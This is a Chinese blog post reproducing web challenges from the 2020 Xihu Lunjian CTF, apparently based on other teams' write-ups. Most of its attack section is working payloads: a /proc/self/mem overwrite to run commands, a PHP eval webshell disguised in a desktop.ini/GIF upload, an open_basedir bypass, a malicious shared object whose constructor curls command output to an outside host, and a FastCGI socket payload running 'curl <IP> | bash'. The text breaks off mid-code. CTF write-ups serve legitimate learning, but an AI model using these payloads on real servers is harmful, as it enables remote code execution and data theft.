{"title":"西湖论剑2020复现","uid":"0c2fa944cd89422ab54a5eca03b47d0e","slug":"西湖论剑2020复现","date":"2020-10-12T08:15:37.000Z","updated":"2020-10-13T04:03:18.000Z","comments":true,"path":"api/articles/西湖论剑2020复现.json","keywords":"A1andNS","cover":[],"content":"<p>今天NU1L和ChaMD5出了Web的WP，赶紧趁热复现一手。</p>\n<h2 id=\"hardxss\"><a href=\"#hardxss\" class=\"headerlink\" title=\"hardxss\"></a>hardxss</h2><p>这题只有两个功能点，一个是子域名爆破，一个是联系站长。试了一下子域名爆破就是个幌子，关键应该在于联系站长的功能。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">嘿~想给我报告BUG链接请解开下面的验证码，只能给我发我网站开头的链接给我哟~我收到邮件后会先点开链接然后登录我的网站！\n&gt; hash &#x3D; md5(vcode)\n&gt; console.log(&#39;验证码:&#39;+hash.substr(0,5))\n------------------------------------------------------------\n验证码:2d7b1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里说我们智能发送这个网站开头的链接给他，并且他会先点开链接然后登录，这感觉上就是要XSS了，我们先试一试吧。查看源代码时发现了一个/login的路由，就是admin login。看看吧,是一个登录框，它会把表单提交到<a href=\"https://auth.hardxss.xhlj.wetolink.com/api/loginVerify%E5%8E%BB%E5%81%9A%E9%AA%8C%E8%AF%81%E3%80%82\">https://auth.hardxss.xhlj.wetolink.com/api/loginVerify去做验证。</a></p>\n<p>根据NU1L的思路，这是要考察xss持久化。然后xss持久化的话有两种方式，分别是serviceworker和cache。这里的cache没法用，所以就要去使用serviceworker，而要去使用serviceworker就要找到一个xss的点，去做一个注册，注册一个serviceworker.</p>\n<p>然后在/login页面下查看script可以看到jsonp，而且没有做过滤，所以就可以在这个路由下来做一个xss.用户的帐号密码是传送到啦auth.hardxss.域名，所以要注册一个serviceworker，需要serviceworker的js在auth.xss域名下，也就是需要找到一个可控点去放置serviceworker的js。</p>\n<p>很可惜到这就无法继续了，果然还是太菜了，希望官方什么时候也可以出一个WP，再详细学一下。</p>\n<h2 id=\"FlagShop\"><a href=\"#FlagShop\" class=\"headerlink\" title=\"FlagShop\"></a>FlagShop</h2><p>在首页的javascript脚本里发现了一个任意文件读取的点</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\">$<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"backend.php\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">&#123;</span>\n    readfile<span class=\"token operator\">:</span> <span class=\"token string\">\"data/FakeCTFer.txt\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">view-source:http:&#x2F;&#x2F;flagshop.xhlj.wetolink.com&#x2F;sandbox&#x2F;b208d5a1-0af7-4d43-815a-7666795a8dc6&#x2F;backend.php?readfile&#x3D;backend.php<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>读取backend.php源代码：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$offset</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'offset'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'offset'</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$buffer</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'buffer'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'buffer'</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">:</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'writefile'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$fp</span> <span class=\"token operator\">=</span> <span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'writefile'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"a\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fseek</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fp</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$offset</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fwrite</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fp</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$buffer</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fp</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'readfile'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'readfile'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>readfile会不经过过滤直接让file_get_content函数去获取，还想用php://input去执行代码，结果不成功，writefile是写文件内容，但是问题在于offset不知道如何去计算，这里我懵逼了，记录一下大佬的payload吧。原理大概是修改/proc/self/mem内存地址信息，来达到getshell做命令执行。</p>\n<p>payload:</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">backend.php?readfile&#x3D;&#x2F;bin&#x2F;bash%20-\nc%20&quot;&#x2F;readflag%20&gt;%20&#x2F;tmp&#x2F;vvvvv&quot;&amp;writefile&#x3D;&#x2F;proc&#x2F;self&#x2F;mem&amp;offset&#x3D;15333784&amp;\nbuffer&#x3D;%90e%F8%F5%FF%7F%00%00&amp;writefile&#x3D;&#x2F;proc&#x2F;self&#x2F;mem&amp;offset&#x3D;15333784&amp;\nbuffer&#x3D;%90e%F8%F5%FF%7F%00%00<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20201013120257.png\" alt=\"flag\"></p>\n<p>读取一下被写入tmp/vvvvv的文件。</p>\n<h2 id=\"NewUpload\"><a href=\"#NewUpload\" class=\"headerlink\" title=\"NewUpload\"></a>NewUpload</h2><p>这里上传文件的套路是<code>\\np\\nh\\np</code>绕过后缀+desktop.ini污染写马。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">ï¿½ï¿½\n[.ShellClassInfo]\nLocalizedResourceName&#x3D;@%SystemRoot%\\system32\\shell32.dll,-21770\nIconResource&#x3D;%SystemRoot%\\system32\\imageres.dll,-112\nIconFile&#x3D;%SystemRoot%\\system32\\shell32.dll\nIconIndex&#x3D;-235\nGIF89&lt;?php  @eval($_POST[&#39;1&#39;]);?&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20201013120223.png\" alt=\"upload1\"></p>\n<p>然后就上传一个木马进入系统,很可惜蚁剑是用不了，无法连接。重新传一个GET马</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20201013120207.png\" alt=\"upload2\"></p>\n<p>system()被禁用了，读不了目录,读一下index.php文件：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n    <span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'open_basedir'</span><span class=\"token punctuation\">,</span> <span class=\"token function\">getcwd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"error\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"错误：: \"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"error\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"&lt;br>\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">else</span>\n        <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"上传文件名: \"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"name\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"&lt;br>\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"文件类型: \"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"type\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"&lt;br>\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"文件大小: \"</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"size\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">/</span> <span class=\"token number\">1024</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\" kB&lt;br>\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"文件临时存储的位置: \"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"tmp_name\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"&lt;br>\"</span><span class=\"token punctuation\">;</span>\n            \n            <span class=\"token comment\">// 判断当前目录下的 upload 目录是否存在该文件</span>\n            <span class=\"token comment\">// 如果没有 upload 目录，你需要创建它，upload 目录权限为 777</span>\n            @<span class=\"token function\">mkdir</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"upload\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">file_exists</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"upload/\"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token keyword\">echo</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"name\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\" 文件已经存在。 \"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token keyword\">else</span>\n            <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token comment\">// 如果 upload 目录不存在该文件则将文件上传到 upload 目录下</span>\n                <span class=\"token function\">move_uploaded_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"tmp_name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"upload/\"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"文件存储在: \"</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"upload/\"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>里面有一个open_basedir，所以就要先去绕过这个限制。</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">mkdir</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'suanve'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'suanve'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'open_basedir'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'..'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'..'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'..'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'..'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'..'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'..'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'..'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'..'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'..'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'..'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'..'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'..'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'..'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'..'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'..'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'open_basedir'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'/'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token function\">scandir</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"../../../../../../../../../../../../../\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'dir'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20201013120149.png\" alt=\"dir\"></p>\n<p>可以看到一个flag文件和一个readflag，常规就是要执行readflag来获取flag。再传一个木马上去。</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">mkdir</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'suanve'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'suanve'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'open_basedir'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'..'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'..'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'..'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'..'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'..'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'..'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'..'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'..'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'..'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'..'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'..'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'..'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'..'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'..'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'..'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'open_basedir'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'/'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>发现flag是读取不了的，没有权限，那么就还是要去执行readflag才行</p>\n<table>\n<thead>\n<tr>\n<th>Server API</th>\n<th>FPM/FastCGI</th>\n</tr>\n</thead>\n<tbody><tr>\n<td></td>\n<td></td>\n</tr>\n</tbody></table>\n<p>这是phpinfo里得到的信息。然后去看一下tmp目录下有什么文件。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20201013120239.png\" alt=\"tmp\"></p>\n<p>发现一个php-cgi-74.sock文件，给服务器放一个so文件。</p>\n<p>用c来生成一个.so文件。</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\">\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">_GNU_SOURCE</span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span>\n<span class=\"token keyword\">__attribute__</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>__constructor__<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">void</span> <span class=\"token function\">preload</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"curl vps:6666/`/readflag`\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">ï¿½ï¿½\n[.ShellClassInfo]\nLocalizedResourceName&#x3D;@%SystemRoot%\\system32\\shell32.dll,-21770\nIconResource&#x3D;%SystemRoot%\\system32\\imageres.dll,-112\nIconFile&#x3D;%SystemRoot%\\system32\\shell32.dll\nIconIndex&#x3D;-235\n&lt;?\n  mkdir(&#39;suanve&#39;);chdir(&#39;suanve&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);\n&#x2F;&#x2F;var_dump(scandir(&quot;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&quot;));\necho copy(&quot;http:&#x2F;&#x2F;vps:9999&#x2F;hpdoger.so&quot;,&quot;&#x2F;tmp&#x2F;sky.so&quot;);\n\n$fp &#x3D; stream_socket_client(&quot;unix:&#x2F;&#x2F;&#x2F;tmp&#x2F;php-cgi-74.sock&quot;, $errno, $errstr,30);$out &#x3D; urldecode(&quot;%01%01%1C%AE%00%08%00%00%00%01%00%00%00%00%00%00%01%04%1C%AE%01%DC%00%00%0E%02CONTENT_LENGTH51%0C%10CONTENT_TYPEapplication&#x2F;text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI&#x2F;1.0%0F%0ESERVER_SOFTWAREphp&#x2F;fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%0B%17SCRIPT_NAME&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A&#x2F;&#x2F;input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP&#x2F;1.1%0C%00QUERY_STRING%0F%17PHP_ADMIN_VALUEextension%20%3D%20&#x2F;tmp&#x2F;sky.so%0D%01DOCUMENT_ROOT&#x2F;%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%01%04%1C%AE%00%00%00%00%01%05%1C%AE%003%00%00%3C%3Fphp%20hello_world%28%27curl%20106.14.114.127%20%7C%20bash%27%29%3B%20%3F%3E%01%05%1C%AE%00%00%00%00&quot;);stream_socket_sendto($fp,$out);while (!feof($fp)) &#123;echo htmlspecialchars(fgets($fp, 10)); 